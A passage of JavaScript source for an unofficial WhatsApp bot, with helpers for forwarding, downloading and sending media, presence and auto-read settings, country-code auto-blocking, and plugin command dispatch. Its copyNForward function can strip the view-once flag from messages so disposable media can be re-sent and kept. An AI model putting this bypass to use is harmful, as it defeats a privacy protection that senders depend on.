    return (decode.user && decode.server ? decode.user + '@' + decode.server : jid);
  } else return jid;
};


conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
  let vtype
  if (options.readViewOnce) {
      message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
      vtype = Object.keys(message.message.viewOnceMessage.message)[0]
      delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
      delete message.message.viewOnceMessage.message[vtype].viewOnce
      message.message = {
          ...message.message.viewOnceMessage.message
      }
  }

  let mtype = Object.keys(message.message)[0]
  let content = generateForwardMessageContent(message, forceForward)
  let ctype = Object.keys(content)[0]
  let context = {}
  if (mtype != "conversation") context = message.message[mtype].contextInfo
  content[ctype].contextInfo = {
      ...context,
      ...content[ctype].contextInfo
  }
  const waMessage = generateWAMessageFromContent(jid, content, options ? {
    ...content[ctype],
    ...options,
    ...(options.contextInfo ? {
      contextInfo: {
        ...content[ctype].contextInfo,
        ...options.contextInfo
      }
    } : {})
  } : {})
  await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
  return waMessage
}
//=================================================
conn.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
  try {
      // Get the quoted message content
      const quoted = message.msg ? message.msg : message;
      let mime = quoted.mimetype || '';

      // Detect message type (image / video / audio / sticker / document)
      let messageType = message.mtype
          ? message.mtype.replace(/Message/gi, '')
          : mime.split('/')[0];

      // Stream binary data
      const stream = await downloadContentFromMessage(quoted, messageType);
      let buffer = Buffer.from([]);

      for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk]);
      }

      // Detect real file type
      const { fileTypeFromBuffer } = await import('file-type');
      let type = await fileTypeFromBuffer(buffer);

      // If file-type fails (rare), apply default extension
      if (!type) {
          type = { ext: mime.split('/')[1] || "bin" };
      }

      // Final file name
      let trueFileName = attachExtension
          ? `${filename}.${type.ext}`
          : filename;

      // Save file to disk
      fs.writeFileSync(trueFileName, buffer);

      return trueFileName;

  } catch (e) {
      console.error("Download Error:", e);
      return null;
  }
};


conn.sendFileUrl = async (jid, url, caption = '', options = {}) => {
  try {
      let buffer = await axios.get(url, { responseType: 'arraybuffer' }).then(res => res.data);

      let ext = path.extname(url).split('?')[0].toLowerCase();  
      let mimeType = mime.lookup(ext) || 'application/octet-stream';

      if (mimeType === 'application/octet-stream') {
          const { fileTypeFromBuffer } = await import('file-type');
          let detectedType = await fileTypeFromBuffer(buffer);
          if (detectedType) {
              mimeType = detectedType.mime;
              ext = detectedType.ext;
          }
      }

      let quoted = {};
      if (
          mek?.message?.extendedTextMessage?.contextInfo?.quotedMessage
      ) {
          quoted = mek.message.extendedTextMessage.contextInfo.quotedMessage;
      }
        
      if (mimeType.startsWith("image")) {
          return conn.sendMessage(jid, { image: buffer, caption, ...options }, quoted);
      }
      if (mimeType.startsWith("video")) {
          return conn.sendMessage(jid, { video: buffer, caption, mimetype: 'video/mp4', ...options }, quoted);
      }
      if (mimeType.startsWith("audio")) {
          return conn.sendMessage(jid, { audio: buffer, mimetype: 'audio/mpeg', ...options }, quoted);
      }
      if (mimeType === "application/pdf") {
          return conn.sendMessage(jid, { document: buffer, mimetype: 'application/pdf', caption, ...options }, quoted);
      }

      return conn.sendMessage(jid, { document: buffer, mimetype: mimeType, caption, filename: `file.${ext}`, ...options }, quoted);

  } catch (error) {
      console.error(`Error in sendFileUrl: ${error.message}`);
  }
};


conn.sendAlbumMessage = async function (jid, medias, options = {}) {
try {
  const quoted = options.quoted || undefined;
  const captions = options.captions || []; // array of captions per media
  const albumCaption = options.text || options.caption || "";

  // Generate album placeholder
  const album = generateWAMessageFromContent(jid, {
    albumMessage: {
      expectedImageCount: medias.filter(m => m.type === "image").length,
      expectedVideoCount: medias.filter(m => m.type === "video").length,
      ...(quoted ? {
        contextInfo: {
          remoteJid: quoted.key.remoteJid,
          fromMe: quoted.key.fromMe,
          stanzaId: quoted.key.id,
          participant: quoted.key.participant || quoted.key.remoteJid,
          quotedMessage: quoted.message
        }
      } : {})
    }
  }, { quoted });

  // Send album placeholder first
  await conn.relayMessage(album.key.remoteJid, album.message, { messageId: album.key.id });

  // Send each media in album
  for (let i = 0; i < medias.length; i++) {
    const media = medias[i];
    let mediaCaption = captions[i] || (i === 0 ? albumCaption : "");

    // Accept Buffer, Base64 string, or path
    let mediaContent = typeof media.data === "string" || Buffer.isBuffer(media.data)
      ? media.data
      : media.data;

    const msg = await generateWAMessage(album.key.remoteJid, {
      [media.type]: mediaContent,
      ...(mediaCaption ? { caption: mediaCaption } : {})
    }, {
      upload: conn.waUploadToServer
    });

    // Link to parent album
    msg.message.messageContextInfo = {
      messageAssociation: { associationType: 1, parentMessageKey: album.key }
    };

    await conn.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
  }

  return album;

} catch (e) {
  console.error("Error in sendAlbumMessage:", e);
  return null;
}
};


conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
  //let copy = message.toJSON()
  let mtype = Object.keys(copy.message)[0]
  let isEphemeral = mtype === 'ephemeralMessage'
  if (isEphemeral) {
      mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
  }
  let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
  let content = msg[mtype]
  if (typeof content === 'string') msg[mtype] = text || content
  else if (content.caption) content.caption = text || content.caption
  else if (content.text) content.text = text || content.text
  if (typeof content !== 'string') msg[mtype] = {
      ...content,
      ...options
  }
  if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
  else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
  if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
  else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
  copy.key.remoteJid = jid
  copy.key.fromMe = sender === conn.user.id

  return proto.WebMessageInfo.fromObject(copy)
}

//=====================================================
conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })

//=====================================================
conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
  let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
  return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
}

//=====================================================
conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })

//=====================================================
conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
  let buttonMessage = {
          text,
          footer,
          buttons,
          headerType: 2,
          ...options
      }
      //========================================================================================================================================
  conn.sendMessage(jid, buttonMessage, { quoted, ...options })
}
//=====================================================
conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
  let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
  var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
      templateMessage: {
          hydratedTemplate: {
              imageMessage: message.imageMessage,
              "hydratedContentText": text,
              "hydratedFooterText": footer,
              "hydratedButtons": but
          }
      }
  }), options)
  conn.relayMessage(jid, template.message, { messageId: template.key.id })
}
    

if (!isOwner) {
if (config.MODE === "private") return;
if (isGroup && config.MODE === "inbox") return;
if (!isGroup && config.MODE === "groups") return;
}


if (config.PRESENCE === "typing") await conn.sendPresenceUpdate("composing", from, [mek.key]);
          if (config.PRESENCE === "recording") await conn.sendPresenceUpdate("recording", from, [mek.key]);
          if (config.PRESENCE === "online") await conn.sendPresenceUpdate('available', from, [mek.key]);
          else await conn.sendPresenceUpdate('unavailable', from, [mek.key]);
          if (config.AUTO_READ_MESSAGES === "true") await conn.readMessages([mek.key]);
          if (config.AUTO_READ_MESSAGES === "commands" && isCmd) await conn.readMessages([mek.key]);
          if (config.AUTO_BLOCK) {
              const countryCodes = config.AUTO_BLOCK.split(',').map(code => code.trim());
              if (countryCodes.some(code => m.sender.startsWith(code))) {
                  await conn.updateBlockStatus(m.sender, 'block');
              }
          }
    

const events = require('./lib')
const EventEmitter = require('events');
EventEmitter.defaultMaxListeners = 10000; 

const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
if (isCmd) {
const gmd = events.commands.find((gmd) => gmd.pattern === (cmdName)) || events.commands.find((gmd) => gmd.alias && gmd.alias.includes(cmdName))
if (gmd) {
if (gmd.react) conn.sendMessage(from, { react: { text: gmd.react, key: mek.key }})

try {
gmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
} catch (e) {
console.error("[STARK MD PLUGIN ERROR]: " + e);
conn.sendMessage(from, { text: `[STARK MD PLUGIN ERROR]:\n${e}`})
}
}
}
events.commands.map(async(command) => {
if (body && command.on === "body") {
command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (mek.q && command.on === "text") {
command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (
(command.on === "image" || command.on === "photo") &&
mek.type === "imageMessage"
) {
command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (
command.on === "sticker" &&
mek.type === "stickerMessage"
) {
command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
}});

})

}
setTimeout(() => {
ConnectAliToWA()
}, 4000);  

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'lib', 'ali.html'));
});

app.listen(port, () => console.log(`[🛸] SERVER LIVE ON http://localhost:${port}`));
